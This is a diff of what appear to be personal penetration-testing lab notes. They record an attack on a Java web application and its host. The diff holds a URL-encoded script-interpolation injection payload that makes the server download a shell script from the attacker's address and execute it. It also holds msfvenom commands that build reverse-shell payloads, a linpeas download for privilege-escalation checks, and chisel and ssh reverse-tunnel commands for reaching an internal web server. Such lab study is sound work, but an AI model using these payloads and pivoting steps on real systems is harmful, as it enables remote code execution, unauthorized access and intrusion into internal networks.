@@ -221,10 +221,10 @@ ${script:javascript:java.lang.Runtime.getRuntime().exec('ping -c3 192.168.45.234
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.234 LPORT=22 -f sh -o shell.sh
 
 # this produces a bash one-liner
-msfvenom -p cmd/unix/reverse_bash LHOST=192.168.45.234 LPORT=22 -f raw -o shell.sh
+msfvenom -p cmd/unix/reverse_bash LHOST=192.168.45.234 LPORT=4444 -f raw -o shell.sh
 
 # use burp repeater to download then execute the shell
-%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime().exec('wget%20192.168.45.234%2Fshell%20-O%20/dev/shm/shell.sh')%7D
+%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime().exec('wget%20192.168.45.234%2Fshell.sh%20-O%20/dev/shm/shell.sh')%7D
 
 %24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime().exec('bash%20/dev/shm/shell.sh')%7D
 
@@ -235,4 +235,20 @@ ss -ntplu
 # find an internal webserver on port 8000
 
 wget http://192.168.45.234/linpeas.sh -O linpeas.sh
+# find writable dir
+/tmp/tomcat.14288260503985590587.8080
+/tmp/tomcat.14288260503985590587.8080/work/Tomcat/localhost/ROOT
+
+# try to access internal web server running at 127.0.0.1:8000
+chisel server --port 8081 --reverse
+sudo tcpdump -nvvvXi tun0 tcp port 8081
+wget http://192.168.45.234/chisel -O chisel
+
+# access the internal webpage at 127.0.0.1:8001
+./chisel client 192.168.45.234:8081 R:8000:0.0.0.0:8000
+
+sudo systemctl status ssh
+sudo systemctl start ssh
+
+ssh -R 8000:localhost:8000 kali@192.168.45.234
 ```
